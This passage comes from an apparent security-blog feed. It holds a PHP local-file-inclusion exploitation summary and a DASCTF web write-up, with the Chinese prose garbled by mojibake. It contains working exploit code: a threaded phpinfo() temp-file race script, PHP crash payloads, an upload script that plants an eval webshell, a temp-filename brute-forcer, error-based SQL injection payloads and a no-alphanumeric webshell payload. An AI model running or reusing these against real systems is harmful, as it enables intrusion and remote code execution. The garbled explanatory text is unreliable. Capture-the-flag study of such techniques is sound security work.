class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0rnrn&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    except socket.<span class="built_in">error</span>, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="keyword">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> not e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot! m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="with-phpå´©æºƒ">with phpå´©æºƒ</h2><h3 id="php-segfault">php segfault</h3><p>å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™</p><p><strong>1. php &lt; 7.2</strong></p><p><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p><p><strong>2. php7 è€ç‰ˆæœ¬é€šæ€</strong></p><p><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p><p>åˆ©ç”¨è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># phpå´©æºƒ ç”Ÿæˆå¤§é‡ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">def upload_file(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, files=files)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">charset = <span class="keyword">string</span>.digits+<span class="keyword">string</span>.letters</span><br><span class="line">webshell = <span class="string">&#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;</span>.encode(<span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27;</span> % (webshell)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload2=r<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">lfi_url = url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=&quot;</span>+payload1</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(times):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">    upload_file(lfi_url, file_content)</span><br></pre></td></tr></table></figure><h3 id="çˆ†ç ´tmpæ–‡ä»¶å">çˆ†ç ´tmpæ–‡ä»¶å</h3><p>ç„¶åçˆ†ç ´ä¸´æ—¶æ–‡ä»¶åæ¥åŒ…å«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="keyword">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><h2 id="session">session</h2><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><p>sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚</p><p><strong>åˆ©ç”¨æ–¹å¼</strong></p><blockquote><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<code>$_SESSION</code>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<code>$_SESSION</code>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ <code>session.upload_progress.prefix</code>ä¸<code>session.upload_progress.name</code>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´sessionä¸­ä¼šæ·»åŠ <code>session.upload_progress.prefix</code>+<code>$_POST[ini_get['session.upload_progress.name']]</code>,è€Œ<code>session.upload_progress.name</code>æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sessionå†™å…¥phpä»£ç ï¼Œç„¶ååŒ…å«sessionæ–‡ä»¶æ¥rce</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-LFIåˆ©ç”¨æ€»ç»“&quot;&gt;PHP LFIåˆ©ç”¨æ€»ç»“&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.anquanke.com/post/id/177491&quot;&gt;https://www.anquanke.com/post/i
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”å†³ç­–æ ‘</title>
    <link href="http://ca0y1h.top/2.%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%86%B3%E7%AD%96%E6%A0%91/"/>
    <id>http://ca0y1h.top/2.%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%86%B3%E7%AD%96%E6%A0%91/</id>
    <published>2020-09-15T03:14:09.000Z</published>
    <updated>2020-09-15T03:14:10.023Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DASCTFå…«æœˆèµ›WP</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2020-09-05T11:53:18.000Z</published>
    <updated>2020-09-07T01:02:34.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå…«æœˆèµ›-Web-Writeup">DASCTFå…«æœˆèµ› Web Writeup</h1><h2 id="å®‰æ’å¤§å­¦">å®‰æ’å¤§å­¦</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>æ¸—é€æµ‹è¯•</li><li>SQLæŠ¥é”™æ³¨å…¥</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p>y1ngå¸ˆå‚…å‡ºçš„ä¸€é“é¢˜ï¼Œéå¸¸é¡¶ï¼Œå¯ä»¥è¯´æ˜¯è¿™æ˜¯ä¸€é“å®æˆ˜æ”¹ç¼–é¢˜ï¼Œy1ngå¸ˆå‚…åœ¨åšæ¸—é€æµ‹è¯•æ—¶ï¼Œåœ¨ä¸€ä¸ªç³»ç»Ÿçš„æŸä¸ªä¸èµ·çœ¼çš„åœ°æ–¹â€”â€”é‚®ä»¶æ¿€æ´»é“¾æ¥å‘ç°äº†SQLæ³¨å…¥ï¼Œå¹¶å¾—åˆ°äº†å…¨æ ¡æ‰€æœ‰å­¦ç”Ÿçš„å†…ç½‘å¹³å°è´¦å·å¯†ç ï¼Œè€Œå­¦ç”Ÿçš„æ‰€æœ‰ä¿¡æ¯ã€æ‰€æœ‰ç½‘ä¸ŠåŠäº‹ç­‰ç­‰å‡ ä¹éƒ½ä½¿ç”¨æ ¡å†…ç½‘å¹³å°çš„è´¦å·å¯†ç ã€‚</p><p>å…¶å®æ¯”èµ›çš„æ—¶å€™ä¸»åŠæ–¹ä¹Ÿæé†’äº†é‚®ç®±ä¸è¦éšä¾¿å¡«ï¼Œä¸è¿‡å½“æ—¶è¿˜æ˜¯æ²¡èƒ½å¯Ÿè§‰åˆ°é‚®ä»¶æ¿€æ´»é“¾æ¥ä¸­çš„ä¸€ä¸ªå‚æ•°å­˜åœ¨SQLæ³¨å…¥ã€‚</p><p>ç°åœ¨æ­£å¼è§£é¢˜ï¼Œç›´æ¥çœ‹é‚®ä»¶æ¿€æ´»é“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨usernameå‚æ•°ï¼Œè¯´ä¸€ä¸‹æˆ‘çš„è§£é¢˜è¿‡ç¨‹ï¼š</p><p>é¦–å…ˆä½¿SQLè¯­å¥æŠ¥é”™</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200253.png" alt=""></p><p>å†å°è¯•ä¸‡èƒ½æ³¨å…¥payloadï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200602.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200905200658101.png" alt=""></p><p>å¥½åƒå¯ä»¥ä½¿ç”¨ç›²æ³¨ï¼Œå†å°è¯•<code>ca01h2' or if(length(select database())&gt;1, 1, 0)--+</code>ï¼Œç»“æœç›´æ¥SQLè¯­å¥æŠ¥é”™</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200842.png" alt=""></p><p>ç›²æ³¨ä¸è¡Œï¼Œè”åˆæ³¨å…¥è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæ¥ç€è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200951.png" alt=""></p><p>æˆåŠŸçˆ†å‡ºå½“å‰ç”¨æˆ·åï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯æ‹¿æ•°æ®ã€‚</p><p>çˆ†è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>ä¸€å…±æœ‰ä¸‰ä¸ªè¡¨ï¼š<code>student, teachers, users</code></p><p>çˆ†åˆ—åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>studentè¡¨ä¸€å…±å››ä¸ªå­—æ®µï¼š<code>id, username, age, sex</code></p><p>teachersè¡¨ï¼š<code>id, f1aaaag, </code></p><p>çˆ†æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+</span><br></pre></td></tr></table></figure><h2 id="rceme">rceme</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>æ— å­—æ¯æ•°å­—webshell</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you are not smart&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯æ•°å­—å’Œéƒ¨åˆ†é€»è¾‘è¿ç®—ç¬¦ä»¥åŠå¸¸ç”¨äºæ„é€ webshellçš„<code>^</code>ã€<code>~</code>ã€<code>&amp;</code>ç­‰ç¬¦å·ã€‚</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé€»è¾‘è¿ç®—ç¬¦æ”¾å‡ºæ¥äº† <code>|</code>æˆ–è¿ç®—ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905222802.png" alt=""></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å¯ä»¥ç”¨pythonè„šæœ¬fuzzå‡ºæ¥çš„ã€‚</p><p>y1ngå¸ˆå‚…çš„æ–¹æ³•ï¼Œç›´æ¥ä¸ç”¨æˆ–è¿ç®—ç¬¦ï¼ŒTQLLLLLLï¼Œä»£ç çœ‹ä¸å¤ªæ‡‚ï¼Œè†œå°±å®Œäº‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">offset = <span class="number">3</span> + buff</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">base = <span class="number">65</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">_ascii = ord(payload[i])</span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">undefined = <span class="string">&quot;$&quot;</span> + (<span 